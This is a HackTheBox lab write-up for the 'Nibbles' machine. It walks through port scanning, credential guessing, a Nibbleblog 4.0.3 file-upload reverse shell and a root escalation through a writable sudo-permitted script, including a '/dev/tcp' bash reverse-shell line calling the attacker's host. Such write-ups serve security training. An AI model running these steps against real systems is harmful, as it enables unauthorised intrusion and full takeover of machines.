# Nibbles | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.25]─[htb-jib1337@htb-mh1tl5ijsg]─[~/my_data/utils]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.1.135
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 13:53 UTC
Nmap scan report for 10.129.1.135
Host is up (0.21s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/28%OT=22%CT=1%CU=38879%PV=Y%DS=2%DC=T%G=Y%TM=5FC257
OS:41%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   214.15 ms 10.10.14.1
2   214.27 ms 10.129.1.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 250.19 seconds
```
The machine is Linux running SSH and Apache.

### 2. Check out the web server
Browsing to the Apache server's homepage, there is some text saying "Hello World!". There is also a comment in the source code.
```html
<b>Hello world!</b>



<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
Browsing to /nibbleblog, there's an empty web blog, which uses the PHP-based web blog CMS Nibbleblog. To find the version number, I locate the source code on Github and then access a few different files on the web server. First I try install.php, which redirects me to: http://10.129.60.60/nibbleblog/update.php. On this page, the version is displayed.
```
Nibbleblog 4.0.3 "Coffee" ©2009 - 2014 | Developed by Diego Najar
```
This version does have an arbritary file upload exploit, but it is autheticated, so I won't be able to access it without credentials.

### 3. Find some credentials
There are no default creds for Nibbleblog, so looking there was a dead end. I tried dirbusting within the Nibbleblog directory to see if there was anything past this point.
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-hanbrktyaa]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.60.60/nibbleblog -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.60.60/nibbleblog
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 11:03:48 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/languages (Status: 301)
===============================================================
2020/12/11 11:31:27 Finished
===============================================================
```
When comparing these results with the github filelist, the content directory stands out. When browsing to it, it is listable. Within the index of nibbleblog/content/private, there is a users.xml file with the following content:
```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">1</session_fail_count>
<session_date type="integer">1607682104</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.14.110">
<date type="integer">1607682104</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```
From this information I determine that the only user of the blog is called "admin", and there appears to be a blacklist that blocks IP addresses after a user fails on login attempts. I confirmed the latter with a google search, which also rules out doing any wordlist attack on the login page. I then went back to the nibbleblog home page and checked out the content there. Trying every user-inputted word on the page (it was easy since there was like 5), I discovered the login credentials were `admin:nibbles`.

### 4. Get a shell on the machine
Now I have creds I can go back to the code execution vulnerability, detailed at https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html.
  
*Obtain Admin credentials (for example via Phishing via XSS which can
be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)
    Activate My image plugin by visiting
http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image
    Upload PHP shell, ignore warnings
    Visit
http://localhost/nibbleblog/content/private/plugins/my_image/image.php.
This is the default name of images uploaded via the plugin.*
  
Basically once the image plugin is activated, I can upload arbritary files when making a post.
Firstly I verify/activate the plugin, by visiting http://10.129.60.60/nibbleblog/admin.php?controller=plugins&action=list.  
Then I go into the plugin settings, and upload my reverse shell. Then I can trigger it by visting nibbleblog/content/private/plugins/my_image/image.php with my listener running.
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-hanbrktyaa]─[~/writeups/HackTheBox/HTB_Nibbles]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.110] from (UNKNOWN) [10.129.60.60] 46738
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:05:55 up  9:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$  
```

### 5. Enumerate from foothold
The first thing I do is check sudo permissions:
```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Checking out monitor.sh:
```bash
nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
```
The file doesn't exist.  
Looking at the contents of the user's home:
```bash
nibbler@Nibbles:/home/nibbler$ ls   
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip -l personal.zip
Archive:  personal.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2017-12-10 21:58   personal/
        0  2017-12-10 22:05   personal/stuff/
     4015  2015-05-08 03:17   personal/stuff/monitor.sh
---------                     -------
     4015                     3 files
```
This is where monitor.sh is.
```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip      
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cat personal/stuff/monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done
```
This is a tecmint monitor script, which does not pose any major issue on it's own, but the problem is I just extracted the file, which means I must have some degree of ownership over it now.
```bash
nibbler@Nibbles:/home/nibbler$ ls -l personal/stuff
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
I have full write access to this file, which I can run as root.

### 6. Escalate to root.
I choose to just make a whole new file rather than modify the existing script.
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ mv monitor.sh monitor2.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ touch monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#!/bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'bash -i >& /dev/tcp/10.10.14.110/9998 0>&1' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
```
All I do then is run my new script using sudo with a listener running:
```bash
─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-hanbrktyaa]─[~/writeups/HackTheBox/HTB_Nibbles]
└──╼ [★]$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.110] from (UNKNOWN) [10.129.60.60] 53720
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
```
